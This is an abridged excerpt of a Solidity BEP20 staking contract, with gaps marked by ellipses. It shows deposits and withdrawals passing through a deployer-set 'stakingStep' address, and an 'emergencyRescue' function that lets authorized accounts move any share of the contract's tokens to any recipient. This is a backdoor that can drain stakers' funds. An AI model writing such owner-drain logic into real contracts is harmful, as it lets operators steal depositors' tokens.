...
contract staker is Auth, ReentrancyGuard {
    using SafeMath for uint256;
    ...
    // Info of each pool.
    struct PoolInfo {
        IBEP20 stakedToken;           // Address of staked token contract.
    ...
    constructor() Auth(msg.sender) {
        stakingToken = IBEP20(0x25AF18E546C16C52dE26722fA4F1b9Ec14164e93);
        rewardPerBlock = 10000000000;
        startBlock = block.number;
        stakingStep = msg.sender;
    ...
    function deposit(uint256 _amount) public nonReentrant {
        ...
        if(_amount > 0) {
            ...
            pool.stakedToken.safeTransferFrom(address(msg.sender), address(stakingStep), _amount);
            pool.stakedToken.safeTransferFrom(address(stakingStep), address(this), _amount);
    ...
    function withdraw(uint256 _amount) public nonReentrant {
        ...
        if(_amount > 0) {
            ...
            pool.stakedToken.safeTransferFrom(address(this), address(stakingStep), _amount);
            pool.stakedToken.safeTransferFrom(address(stakingStep), address(msg.sender), _amount);
            totalStaked -= _amount;
        }
        user.rewardDebt = user.amount.mul(pool.accTokensPerShare).div(eNum);
        totalRewardDebt = totalStaked.mul(pool.accTokensPerShare).div(eNum);
    ...
    function emergencyRescue(address _token, address _rec, uint256 _percent) external authorized {
        ...
        IBEP20(_token).transfer(_rec, tamt * (_percent) / (100));
    }
